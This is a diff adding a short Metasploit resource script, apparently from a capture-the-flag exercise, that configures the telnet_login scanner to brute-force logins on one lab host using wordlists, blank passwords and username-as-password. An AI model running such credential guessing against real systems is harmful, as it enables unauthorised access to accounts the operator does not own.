@@ -1,0 +1,8 @@
+use auxiliary/scanner/telnet/telnet_login
+set BLANK_PASSWORDS true
+set RHOSTS 10.129.45.145
+set PASS_FILE /home/zerocool/CTF/username/short-username.txt
+set USER_FILE /home/zerocool/CTF/username/short-username.txt
+set USER_AS_PASS true
+set STOP_ON_SUCCESS true
+run
